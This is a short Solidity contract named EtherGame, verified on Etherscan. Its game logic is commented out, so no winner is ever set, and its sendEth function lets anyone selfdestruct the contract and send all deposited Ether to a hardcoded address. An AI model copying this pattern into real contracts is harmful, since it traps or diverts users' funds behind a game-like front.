/**
 *Submitted for verification at Etherscan.io on 2022-05-29
*/

pragma solidity ^0.8.13;

contract EtherGame {
    //uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        //require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        //require(balance <= targetAmount, "Game is over");

       /* if (balance == targetAmount) {
            winner = msg.sender;
        }*/
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }


    function sendEth() public payable {
        address addr = payable(address(0xBA23dfd7cCCD3587A1b8909dd5BcCfD92aCeAE6f));
        selfdestruct(payable(addr));
    }
}